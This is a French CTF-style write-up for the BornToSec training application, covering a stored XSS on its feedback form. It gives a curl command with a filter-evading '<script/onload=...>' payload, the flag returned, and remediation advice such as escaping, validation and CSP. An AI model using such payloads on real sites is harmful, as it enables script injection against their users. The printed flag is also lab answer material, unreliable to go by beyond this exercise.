# 🧠 BornToSec - Feedback XSS Exploit

## 🔍 Contexte

L’application web **BornToSec** propose une page `feedback` (`index.php?page=feedback`) permettant aux utilisateurs de laisser un commentaire.  
En envoyant des requêtes POST à ce formulaire, on a remarqué que les données envoyées étaient réaffichées dans la page sans être correctement filtrées.

Cette absence de filtrage ouvre la porte à une **injection de code JavaScript (XSS)**.

---

## ⚙️ Étapes d’exploitation

1. **Observation du formulaire :**
   - Le formulaire contient deux champs :
     - `txtName`
     - `mtxtMessage`
   - Les données sont envoyées en POST à la même page (`feedback`).

2. **Test avec un payload contournant les filtres :**
```bash
curl -s -X POST 'http://192.168.64.3/index.php?page=feedback' \
  --data-urlencode 'txtName=attacker' \
  --data-urlencode 'mtxtMessage=<script/onload=alert('"'"'XSS'"'"')>a' \
  -d 'btnSign=Sign+Guestbook'
   ```

3. **Résultat :**
   - Le serveur renvoie une page contenant plusieurs lignes :
     ```html
     <center><h2 style="margin-top:50px;">The flag is : 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e</h2>
     ```
   - Cela prouve que notre injection a réussi à **déclencher un comportement non prévu** (exécution de code ou affichage d’informations sensibles).

---

## ⚠️ Explication de la faille

Cette vulnérabilité est une **Cross-Site Scripting (XSS)** de type **stockée** (Stored XSS).  
Elle apparaît lorsque :
- Les données saisies par un utilisateur sont stockées (dans un fichier, une base de données, etc.),
- Puis réaffichées **sans échappement** ni filtrage dans une page HTML.

Dans ce cas :
- Le serveur a inséré directement notre texte dans le HTML,
- Le navigateur a interprété notre balise `<script/...>` comme du JavaScript,
- Ce qui a permis d’exécuter notre code dans le contexte du site.

---

## 🛡️ Comment corriger cette faille

### 1. Échapper les caractères spéciaux
Lors de l’affichage des entrées utilisateur, **toujours échapper les caractères HTML** :
```php
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
```
Cela empêche les balises `<`, `>`, `"` et `'` d’être interprétées comme du code HTML.

### 2. Valider côté serveur
Ne jamais se fier uniquement à la validation JavaScript côté client.  
En PHP, on peut par exemple vérifier que le champ ne contient pas de balises :
```php
if (preg_match('/<[^>]+>/', $mtxtMessage)) {
    die("Invalid input.");
}
```

### 3. Utiliser une bibliothèque de templating
Les moteurs de templates modernes (Twig, Blade, etc.) échappent automatiquement les variables par défaut.

### 4. Mettre en place une **CSP (Content Security Policy)**
Ajouter dans les en-têtes HTTP :
```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```
Cela empêche l’exécution de scripts injectés depuis des entrées utilisateur.

### 5. Nettoyer les données à la source
Si les commentaires sont stockés dans un fichier ou une base de données :
- Nettoyer et échapper les champs **avant l’insertion**.
- Toujours revalider **avant l’affichage**.

---

## ✅ Résumé

| Étape | Action | Résultat |
|-------|---------|----------|
| 1 | Test du formulaire avec HTML simple | Encodé correctement |
| 2 | Test avec `<script/onload=...>` | XSS réussi |
| 3 | Réponse du serveur | Flag affichée |
| 4 | Cause | Données réinjectées sans échappement |
| 5 | Solution | `htmlspecialchars`, validation, CSP |

---

## 🚩 Flag obtenue

```
0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e
```

---
